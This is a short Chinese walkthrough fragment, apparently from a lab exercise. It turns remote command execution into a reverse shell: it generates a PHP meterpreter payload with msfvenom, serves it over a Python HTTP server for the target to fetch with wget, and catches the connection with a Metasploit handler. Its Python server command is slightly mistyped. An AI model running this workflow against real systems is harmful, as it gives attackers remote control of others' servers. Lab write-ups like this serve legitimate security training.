漏洞利用

  exp跑起来

  目前有简单的权限执行但还不够需要提权

  通过远程命令执行上传一个shell来让msf连上

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.146 LPORT=4444 -f raw > shell2.php

  python3开启简单http服务

python3 -m httpserver

  wget访问本机下载shell，然后msf端口监听

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 192.168.1.146
LHOST => 192.168.1.146
msf5 exploit(multi/handler) > run

  这里需要通过web访问到对应地址访问上线

  或者可以通过python反弹shell
